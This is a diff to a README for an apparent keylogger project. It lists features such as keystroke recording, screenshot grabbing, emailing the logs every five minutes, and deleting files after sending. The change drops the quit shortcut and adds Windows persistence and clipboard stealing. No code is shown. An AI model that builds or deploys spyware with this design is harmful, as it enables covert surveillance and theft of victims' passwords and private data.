@@ -3,13 +3,15 @@ A keylogger is a tool that can record and report on a computer user’s activity
 
 # Features
 * Record keystrokes
-* Screenshot every 5 min
+* Screenshot Grabbing
+* Email sending every 5 mins
 * Email sending error handling (retry every 60 secs)
-* System info  --> username, operating system, node name, release, version, machine, and processor.
-* Network info --> hostname and IP address
+* System info 
+* Network info
 * Delete the files after sending on email
 * Starts functioning after 21 secs
-* Press Ctrl+q to quit
+* Windows persistant
+* Clipboard stealing
 # Requirement
 + pip install -r requirements.txt
 
